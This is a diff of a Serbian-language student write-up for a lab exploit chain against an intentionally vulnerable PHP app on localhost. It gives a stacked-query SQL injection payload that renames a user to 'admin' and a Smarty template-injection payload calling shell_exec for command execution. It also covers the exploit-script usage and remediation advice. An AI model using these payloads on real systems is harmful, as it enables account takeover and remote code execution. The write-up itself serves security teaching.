@@ -174,9 +174,9 @@ python3 scripts/exploit_chain.py http://localhost:8000 user1 'nova_sifra'
 
 
 
-- Statička analiza ručnim čitanjem u VS Code-u, praćenjem toka podataka od HTTP parametra do SQL upita.
-- Koristio sam `grep -rn "pg_query\b" app/` da nađem sve pozive koji ne koriste parameterizovane upite — svaki takav poziv je potencijalni SQLi kandidat.
-- **Zašto:** `pg_query()` (za razliku od `pg_query_params()`) prima sirov SQL string i **podržava stacked queries** (više naredbi razdvojenih sa `;`), što znači da jedna injekcija može pokrenuti i `SELECT` i `UPDATE`/`DELETE` u istom zahtevu.
+- Statička analiza ručnim čitanjem u VS Code-u, praćenjem toka podataka od HTTP parametra do SQL upita i zatim do login/session logike.
+- Koristio sam `grep -rn "pg_query\\|isadmin\\|username" app/` da nađem neparametrizovane SQL upite i način na koji aplikacija odlučuje ko je admin.
+- **Zašto:** u ovoj verziji aplikacije nema `is_admin` kolone; admin privilegija zavisi od toga da li je korisnik u sesiji ulogovan sa username vrednošću `admin`.
 
 
 
@@ -184,91 +184,67 @@ python3 scripts/exploit_chain.py http://localhost:8000 user1 'nova_sifra'
 
 
 
-- Na `/admin.php` postoji panel dostupan samo adminu — aplikacija vrši redirect na login ako `is_admin` nije `true` u bazi.
-- Tabela `users` u `docker/init.sql` ima kolonu `is_admin BOOLEAN DEFAULT false`.
-- Admin (`admin`) ima `is_admin = true`; regularni korisnici (`user1`, `user2`) imaju `false`.
-- **Zašto:** Cilj je promeniti `is_admin` vrednost za naš nalog direktno u bazi, bez znanja admin lozinke.
+- Admin funkcije su dostupne preko `admin/update_motd.php`.
+- `update_motd.php` proverava samo `$_SESSION['isadmin']`.
+- U `login.php` se `$_SESSION['isadmin'] = true` postavlja kada je `$_SESSION['username'] === 'admin'`.
+- Tabela `users` u `docker/init.sql` nema unique constraint nad kolonom `username`.
+- **Zašto:** ako možemo promeniti username regularnog korisnika u `admin`, zatim se ulogovati tom lozinkom, aplikacija će sesiju tretirati kao admin.
 
 
 
-**Pronalaženje ranjivog mesta — class.php**
+**Pronalaženje ranjivog mesta - forgotusername.php**
 
 
 
-- U `app/class.php` (linija ~18) nalazi se sledeći kod:
+- U `app/forgotusername.php` nalazi se sledeći kod:
 
 ```php
-$sql = "SELECT * FROM class_posts WHERE title = '" . $_POST['title'] . "'";
-$result = pg_query($conn, $sql);
+$username = $_POST['username'];
+$ret = pg_query($db, "select * from users where username='".$username."';");
 ```
 
-- Parametar `$_POST['title']` se direktno spaja u SQL string — **nema prepared statement-a, nema escapovanja**.
-- Isti fajl koristi `pg_query()` umesto `pg_query_params()`, što dozvoljava stacked queries.
-- **Zašto:** Kontrolišemo ceo sadržaj između navodnika; možemo zatvoriti string i dodati proizvoljne SQL naredbe.
+- Parametar `username` se direktno spaja u SQL string.
+- Koristi se `pg_query()`, pa PostgreSQL prihvata stacked queries.
+- **Zašto:** kontrolišemo sadržaj između navodnika; možemo zatvoriti string, dodati `UPDATE`, i ostatak originalnog upita pretvoriti u komentar.
 
 
 
-**Kako sam potvrdio ranjivost**
-
-
-
-1. Ulogovao sam se kao `user1` (nakon Step 1).
-2. Poslao sam ručni POST zahtev s Burp Suite-om:
-
-```
-POST /class.php HTTP/1.1
-...
-title=test' ; SELECT pg_sleep(2) --
-```
-
-3. Odgovor je stigao ~2 sekunde kasnije → **potvrđen time-based SQLi**.
-4. Proverio sam DB log:
-
-```bash
-docker logs tudo-db 2>&1 | tail -5
-```
-
-   - Vidljiv je SQL upit s ubačenom `pg_sleep` naredbom — injekcija izvršena.
-
-
-
-**Exploit payload — stacked UPDATE**
+**Exploit payload - promena username-a**
 
 
 
 - Payload za eskalaciju privilegija:
 
-```
-' ; UPDATE users SET is_admin=true WHERE username='user1' --
+```sql
+'; UPDATE users SET username='admin' WHERE username='user1' --
 ```
 
 - Dekompozicija:
-  - `'` — zatvara originalni string literal.
-  - `;` — PostgreSQL separator koji dozvoljava novu naredbu.
-  - `UPDATE users SET is_admin=true WHERE username='user1'` — direktna izmena privilegija.
-  - ` --` — komentariše ostatak originalnog upita (sprečava SQL sintaksnu grešku).
-- Rezultat u bazi:
+  - `'` - zatvara originalni string literal.
+  - `;` - pokreće novu SQL naredbu.
+  - `UPDATE users SET username='admin' WHERE username='user1'` - menja username našeg naloga.
+  - ` --` - komentariše ostatak originalnog upita.
+- Posle Step 1 već znamo novu lozinku za `user1`.
+- Nakon UPDATE-a radimo login kao `admin` sa tom novom lozinkom.
+- **Zašto:** login upit proverava username i hash lozinke; izmenjeni `user1` red sada ima username `admin` i lozinku koju kontrolišemo.
 
-```bash
-docker exec -it tudo-db psql -U postgres tudo -c "SELECT username, is_admin FROM users;"
+
+
+**Verifikacija - admin panel**
+
+
+
+- Posle SQLi payload-a skripta radi logout iz stare `user1` sesije.
+- Zatim šalje `POST /login.php` sa:
+
+```text
+username=admin
+password=nova_sifra
 ```
 
-```
- username | is_admin
-----------+----------
- admin    | t
- user1    | t        ← promenjen
- user2    | f
-```
-
-
-
-**Verifikacija — admin panel**
-
-
-
-- Nakon injekcije, `GET /admin.php` vraća HTTP 200 (umesto 302 redirect) → korisnik `user1` je sada admin.
-- **Zašto:** Aplikacija proverava `is_admin` iz baze pri svakom zahtevu; posle UPDATE-a, provera prolazi.
+- Ako login uspe, `login.php` postavlja `$_SESSION['isadmin'] = true`.
+- `GET /admin/update_motd.php` zatim vraća HTTP 200 i prikazuje formu "Update MoTD".
+- **Zašto:** to potvrđuje da imamo stvarnu admin sesiju, a ne samo izmenjen podatak u bazi.
 
 
 
@@ -276,18 +252,20 @@ docker exec -it tudo-db psql -U postgres tudo -c "SELECT username, is_admin FROM
 
 
 
-- Lokacija: `tudo/scripts/privesc.py` (helper), `tudo/scripts/exploit_chain.py` (Step 2).
-- Pokretanje (Step 1 + Step 2 zajedno):
+- Lokacija: `rbs-main/v5/privesc.py` (helper), `rbs-main/v5/exploit_chain.py` (Step 2).
+- Pokretanje kompletnog chain-a:
 
 ```bash
-cd tudo
-python3 scripts/exploit_chain.py http://localhost:8000 user1 'nova_sifra'
+cd rbs-main/v5
+python3 exploit_chain.py http://localhost:8000 user1 'nova_sifra'
 ```
 
 - Koraci koje skripta radi (Step 2):
-  1. Proverava da li je korisnik već admin (`GET /admin.php`).
-  2. Šalje `POST /class.php` s malicioznim `title` parametrom (stacked UPDATE).
-  3. Ponovo proverava `/admin.php` — ako vraća 200, privesc je uspeo.
+  1. Proverava da li je trenutna sesija već admin preko `GET /admin/update_motd.php`.
+  2. Radi logout iz regularne sesije.
+  3. Šalje SQLi payload na `POST /forgotusername.php`.
+  4. Loguje se kao `admin` sa lozinkom postavljenom u Step 1.
+  5. Ponovo proverava `admin/update_motd.php`.
 
 
 
@@ -295,9 +273,10 @@ python3 scripts/exploit_chain.py http://localhost:8000 user1 'nova_sifra'
 
 
 
-- Tip ranjivosti: SQL Injection (stacked queries) — CWE-89.
-- Mesto: `app/class.php`, parametar `$_POST['title']`, funkcija `pg_query()`.
-- Impact: autentifikovani korisnik bez administratorskih prava može sebi dodeliti `is_admin=true` i dobiti pun pristup admin panelu.
+- Tip ranjivosti: SQL Injection (stacked queries) + slaba admin autorizacija.
+- Mesto: `app/forgotusername.php`, parametar `$_POST['username']`, funkcija `pg_query()`.
+- Dodatni uzrok: `login.php` admin status vezuje za username string `admin`, a ne za robustan serverski permission model.
+- Impact: napadač koji je preuzeo regularan nalog može napraviti admin sesiju bez znanja originalne admin lozinke.
 - PoC: `privesc.py` pozvan iz `exploit_chain.py` Step 2.
 
 
@@ -306,20 +285,177 @@ python3 scripts/exploit_chain.py http://localhost:8000 user1 'nova_sifra'
 
 
 
-- Koristiti **parameterizovane upite** (`pg_query_params()`) umesto spajanja stringa:
+- Koristiti parameterizovane upite:
 
 ```php
-// Sigurno:
-$result = pg_query_params($conn,
-    "SELECT * FROM class_posts WHERE title = $1",
-    [$_POST['title']]
-);
+$ret = pg_prepare($db, "forgotusername_query", "select * from users where username = $1");
+$ret = pg_execute($db, "forgotusername_query", array($username));
 ```
 
-- `pg_query_params()` tretira parametre kao **podatke**, a ne kao deo SQL sintakse — stacked queries i string escape nisu mogući.
-- Primeniti **principe najmanjeg privilegija** na nivou DB korisnika: aplikacioni DB nalog ne bi trebalo da ima `UPDATE` dozvolu na tabeli `users`.
-- Dodati serversku validaciju ulaza (whitelist karaktera, maksimalna dužina) kao dodatni sloj odbrane.
-- **Zašto:** Parametrizacija eliminiše SQLi na samom izvoru — napadač ne može izaći iz konteksta podatka bez obzira na sadržaj unosa.
+- Dodati `UNIQUE` constraint na `users.username`.
+- Admin privilegije čuvati kao poseban server-side permission atribut, ne zaključivati ih samo iz username stringa.
+- Posle promene privilegija ili identiteta invalidirati postojeće sesije.
+- **Zašto:** parametrizacija uklanja SQLi, a stabilan permission model sprečava da obična promena username-a postane eskalacija privilegija.
 
 
-**Remote Code Execution - Ime Prezime SVXX/2022**
+**REMOTE CODE EXECUTION - Aleksa Siljic SV50/2022**
+
+
+
+**Metod pregleda koda**
+
+
+
+- RCE sam tražio ručnom statičkom analizom, fokusirano na admin funkcionalnosti koje obrađuju fajlove, template-e i korisnički kontrolisan sadržaj.
+- Koristio sam pretragu po opasnim funkcijama i površinama:
+
+```bash
+grep -rn "fopen\|fwrite\|fetch\|Smarty\|unserialize\|move_uploaded_file\|shell_exec\|system" app/
+```
+
+- **Zašto:** RCE često nastaje tamo gde aplikacija korisnički unos upisuje u fajl koji se kasnije izvršava, parsira kao template, učitava kao kod ili prosleđuje sistemskoj komandi.
+
+
+
+**Mapiranje RCE površine**
+
+
+
+- Posle admin privilege escalation koraka dobijamo pristup admin funkcijama.
+- Na glavnoj stranici (`index.php`) admin vidi link ka `admin/update_motd.php`.
+- `admin/update_motd.php` omogućava adminu da promeni Message of the Day.
+- `index.php` zatim učitava isti MoTD fajl preko Smarty template engine-a.
+- **Zašto:** ako možemo da upišemo Smarty sintaksu u template fajl, a aplikacija taj fajl izvršava kao template, korisnički unos postaje server-side template code.
+
+
+
+**Pronalaženje ranjivog mesta - update_motd.php**
+
+
+
+- U `app/admin/update_motd.php` nalazi se sledeći kod:
+
+```php
+$message = $_POST['message'];
+
+if ($message !== "") {
+    $t_file = fopen("../templates/motd.tpl","w");
+    fwrite($t_file, $message);
+    fclose($t_file);
+}
+```
+
+- Parametar `message` se bez filtriranja upisuje direktno u `app/templates/motd.tpl`.
+- Nema whitelist-e dozvoljenih tagova, nema escape-a Smarty delimiter-a (`{` i `}`), nema sandbox/security moda.
+- **Zašto:** `motd.tpl` nije običan tekstualni fajl; kasnije ga parsira Smarty, pa sadržaj fajla ima semantiku koda.
+
+
+
+**Kako se template izvršava - index.php**
+
+
+
+- U `app/index.php` nalazi se:
+
+```php
+require 'vendor/autoload.php';
+$smarty = new Smarty();
+$smarty->assign("username", $_SESSION['username']);
+$smarty->force_compile = true;
+echo $smarty->fetch("motd.tpl").'<br>';
+```
+
+- Smarty 2.6.31 je instaliran kroz Composer.
+- Security mode nije uključen (`$smarty->security` ostaje default `false`).
+- `force_compile = true` dodatno olakšava eksploataciju jer se template rekompajlira pri učitavanju.
+- **Zašto:** napadač prvo upisuje payload u template, a zatim običnim `GET /index.php` tera aplikaciju da taj payload kompajlira i izvrši.
+
+
+
+**Ranjivost - Server-Side Template Injection**
+
+
+
+- Smarty dozvoljava upotrebu PHP funkcija kao template modifikatora kada security mode nije uključen.
+- Payload za izvršavanje komande:
+
+```smarty
+{"id 2>&1"|shell_exec}
+```
+
+- Dekompozicija:
+  - `"id 2>&1"` - string koji predstavlja shell komandu.
+  - `|shell_exec` - Smarty modifikator koji poziva PHP funkciju `shell_exec`.
+  - rezultat se ispisuje u HTML odgovoru jer se template renderuje na `/index.php`.
+- **Zašto:** aplikacija tretira admin unos kao trusted template kod, ali nakon Step 2 napadač postaje admin i može kontrolisati taj unos.
+
+
+
+**Kako sam potvrdio ranjivost**
+
+
+
+1. Nakon Step 1 i Step 2, pristupio sam `GET /admin/update_motd.php`.
+2. Poslao sam `POST /admin/update_motd.php` sa `message` vrednošću:
+
+```smarty
+RCE_START
+{"id 2>&1"|shell_exec}
+RCE_END
+```
+
+3. Otvorio sam `GET /index.php`.
+4. U odgovoru se između markera pojavljuje output komande `id`.
+5. Time je potvrđeno da se komanda izvršava na serveru, u kontekstu web procesa.
+
+
+
+**Exploit skripta**
+
+
+
+- Lokacija: `rbs-main/v5/rce.py` (helper), `rbs-main/v5/exploit_chain.py` (Step 3).
+- Pokretanje kompletnog chain-a:
+
+```bash
+cd rbs-main/v5
+python3 exploit_chain.py http://localhost:8000 user1 'nova_sifra'
+```
+
+- Pokretanje sa drugom komandom:
+
+```bash
+python3 exploit_chain.py http://localhost:8000 user1 'nova_sifra' -c 'whoami'
+```
+
+- Koraci koje skripta radi (Step 3):
+  1. Proverava da li je `admin/update_motd.php` dostupan trenutnoj sesiji.
+  2. Upisuje Smarty payload u `templates/motd.tpl`.
+  3. Poziva `GET /index.php` kako bi se template izvršio.
+  4. Traži output komande između `RCE_START_...` i `RCE_END_...` markera.
+  5. Ispisuje output u terminal.
+
+
+
+**Rezime RCE provere**
+
+
+
+- Tip ranjivosti: Server-Side Template Injection (SSTI) koja vodi do RCE.
+- Mesto: `app/admin/update_motd.php`, parametar `message`; izvršavanje u `app/index.php` preko `Smarty::fetch("motd.tpl")`.
+- Preduslov: admin sesija, koju exploit chain dobija u Step 2.
+- Impact: napadač može izvršavati proizvoljne sistemske komande na serveru.
+- PoC: `rce.py` pozvan iz `exploit_chain.py` Step 3.
+
+
+
+**Kako sprečiti ovu ranjivost**
+
+
+
+- Ne dozvoliti da korisnički unos direktno postane template fajl.
+- MoTD poruku čuvati kao običan tekst u bazi i prikazivati je sa HTML escape-om, npr. `htmlentities`.
+- Ako admin mora da koristi formatiranje, dozvoliti samo mali whitelist bezbednih tagova, npr. Markdown bez HTML-a.
+- Uključiti Smarty security mode i zabraniti PHP funkcije/modifikatore koji mogu izvršavati komande.
+- Template fajlove tretirati kao deo aplikacionog koda, ne kao dinamički korisnički sadržaj.
+- **Zašto:** razdvajanjem podataka od template koda sprečava se da unos iz forme dobije mogućnost izvršavanja na serveru.
